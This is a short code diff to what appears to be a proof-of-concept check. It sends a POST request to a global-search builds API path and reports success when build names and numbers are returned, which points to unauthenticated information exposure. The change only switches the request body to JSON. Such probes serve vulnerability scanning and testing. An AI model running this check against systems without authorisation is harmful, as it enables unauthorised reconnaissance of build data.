@@ -37,9 +37,9 @@ def poc(url):
 
         path = """/ui/api/v1/global-search/builds?jfLoader=true"""
         method = "POST"
-        data = """{"name":"","before":"","after":"","direction":"desc","order_by":"date","num_of_rows":100}"""
+        data = {"name":"","before":"","after":"","direction":"desc","order_by":"date","num_of_rows":100}
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if ("""last_build_number""" in resp0.text and """build_name""" in resp0.text) and ("""application/json""" in str(resp0.headers)) and (resp0.status_code == 200):
             result["success"] = True
